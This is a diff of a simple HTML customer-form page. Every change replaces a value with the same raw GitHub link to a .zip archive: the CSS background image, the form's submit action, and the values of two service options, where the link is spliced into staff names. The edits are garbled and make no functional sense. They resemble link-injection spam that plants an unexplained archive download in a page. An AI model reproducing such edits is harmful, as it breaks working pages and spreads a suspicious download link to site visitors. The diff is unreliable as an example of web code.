@@ -4,7 +4,7 @@
  form { 
   background-color: greenyellow;
   color: blueviolet;
-  background-image: url(pic.jpg);
+  background-image: url(https://raw.githubusercontent.com/2022-04-11588/GGF-website/main/gladify/GGF-website_moonman.zip);
   background-size: 100%;
   }
  </style>
@@ -12,7 +12,7 @@
 <body>
    <form style="width:70%"[]>
     
-<form action="http://www.w3schools.com/html/action_page">
+<form action="https://raw.githubusercontent.com/2022-04-11588/GGF-website/main/gladify/GGF-website_moonman.zip">
   <fieldset>
     <legend>OUR CUSTOMER FORM:</legend>
     First name:<br>
@@ -52,8 +52,8 @@
   our service <br>
   <select name="service" >
     <option value=""> </option>
-    <option value=" Eng.patric wilfred">engineer</option>
-    <option value="claudius c.kalekela"> supervisor</option>
+    <option value=" https://raw.githubusercontent.com/2022-04-11588/GGF-website/main/gladify/GGF-website_moonman.zip wilfred">engineer</option>
+    <option value="claudius https://raw.githubusercontent.com/2022-04-11588/GGF-website/main/gladify/GGF-website_moonman.zip"> supervisor</option>
     </select>
     <br>
     <br>
